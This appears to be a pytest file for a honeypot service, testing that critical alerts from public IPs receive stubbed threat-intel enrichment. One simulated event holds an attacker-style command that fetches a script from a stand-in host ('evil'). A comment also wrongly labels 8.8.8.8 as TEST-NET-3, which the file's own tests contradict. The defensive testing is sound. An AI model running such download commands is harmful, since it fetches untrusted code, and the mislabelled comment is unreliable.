"""Auto-enrichment of CRITICAL alerts.

Verifies the background-enrichment hook in `event_buffer._flush`: a flushed
CRITICAL alert with a routable source IP gets VT + AbuseIPDB + GeoIP data
merged into its payload. Non-routable IPs (loopback, RFC1918, 0.0.0.0) and
non-CRITICAL severities are skipped.
"""

import asyncio
import os

import pytest

os.environ["DATABASE_URL"] = "sqlite+aiosqlite:///:memory:"


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


@pytest.fixture
def stub_intel(monkeypatch):
    """Replace intel lookup functions with deterministic stubs so tests don't
    depend on API keys or network. Each stub returns a payload tagged so we
    can confirm the right enrichment ended up in the alert."""

    async def fake_vt(ip):
        return {"available": True, "ip": ip, "reputation": -7, "_stub": "vt"}

    async def fake_abuse(ip, max_age_days=90):
        return {"available": True, "ip": ip, "abuse_confidence_score": 91, "_stub": "abuse"}

    async def fake_geo(ip):
        return {"available": True, "ip": ip, "country": "Stubland", "_stub": "geo"}

    monkeypatch.setattr("honeypot_mcp.intel.virustotal.lookup_virustotal", fake_vt)
    monkeypatch.setattr("honeypot_mcp.intel.abuseipdb.lookup_abuseipdb", fake_abuse)
    monkeypatch.setattr("honeypot_mcp.intel.geoip.lookup_geoip", fake_geo)


@pytest.mark.asyncio
async def test_critical_alert_gets_enrichment(stub_intel):
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.event_buffer import PendingEvent, submit_event
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        await submit_event(
            PendingEvent(
                honeypot_id=None,
                source_ip="8.8.8.8",  # TEST-NET-3, routable for our purposes
                event_type="ssh_file_download",
                payload={"command": "wget http://evil/x.sh"},
                severity=AlertSeverity.CRITICAL,
            )
        )
        # Long enough for flush + background enrichment task to settle.
        await asyncio.sleep(1.5)
    finally:
        await buf.stop()

    async with get_session() as session:
        alerts = list((await session.execute(select(Alert))).scalars().all())

    assert len(alerts) == 1
    enrichment = alerts[0].payload.get("enrichment")
    assert enrichment is not None, f"expected enrichment in payload, got: {alerts[0].payload}"
    assert enrichment["virustotal"]["_stub"] == "vt"
    assert enrichment["abuseipdb"]["_stub"] == "abuse"
    assert enrichment["geoip"]["_stub"] == "geo"


@pytest.mark.asyncio
async def test_non_critical_alert_skips_enrichment(stub_intel):
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.event_buffer import PendingEvent, submit_event
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        await submit_event(
            PendingEvent(
                honeypot_id=None,
                source_ip="1.1.1.1",
                event_type="ssh_login_failed",
                payload={},
                severity=AlertSeverity.HIGH,  # NOT critical
            )
        )
        await asyncio.sleep(1.5)
    finally:
        await buf.stop()

    async with get_session() as session:
        alerts = list((await session.execute(select(Alert))).scalars().all())

    assert len(alerts) == 1
    assert "enrichment" not in alerts[0].payload


@pytest.mark.asyncio
async def test_loopback_critical_skips_enrichment(stub_intel):
    """127.0.0.1 / 0.0.0.0 / RFC1918 — never worth enriching."""
    from sqlalchemy import select

    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.event_buffer import PendingEvent, submit_event
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    buf = event_buffer.get_buffer()
    await buf.start()
    try:
        for ip in ("127.0.0.1", "10.0.0.5", "0.0.0.0"):
            await submit_event(
                PendingEvent(
                    honeypot_id=None,
                    source_ip=ip,
                    event_type="honeypot_health_failed",
                    payload={},
                    severity=AlertSeverity.CRITICAL,
                )
            )
        await asyncio.sleep(1.5)
    finally:
        await buf.stop()

    async with get_session() as session:
        alerts = list((await session.execute(select(Alert))).scalars().all())

    assert len(alerts) == 3
    for a in alerts:
        assert "enrichment" not in a.payload, f"{a.source_ip} should not have been enriched"


@pytest.mark.asyncio
async def test_enrichable_ip_classification():
    """Direct unit test of the IP-routability classifier."""
    from honeypot_mcp.storage.event_buffer import _is_enrichable_ip

    # Routable public addresses → True
    assert _is_enrichable_ip("8.8.8.8") is True
    assert _is_enrichable_ip("1.1.1.1") is True

    # Loopback / private / link-local / zero / TEST-NET / garbage → False
    assert _is_enrichable_ip("127.0.0.1") is False
    assert _is_enrichable_ip("10.0.0.1") is False
    assert _is_enrichable_ip("192.168.1.1") is False
    assert _is_enrichable_ip("172.16.0.1") is False
    assert _is_enrichable_ip("169.254.1.1") is False
    assert _is_enrichable_ip("0.0.0.0") is False
    # TEST-NET ranges (RFC 5737) — reserved for documentation, not enrichable
    assert _is_enrichable_ip("192.0.2.1") is False
    assert _is_enrichable_ip("203.0.113.42") is False
    assert _is_enrichable_ip("") is False
    assert _is_enrichable_ip("not-an-ip") is False
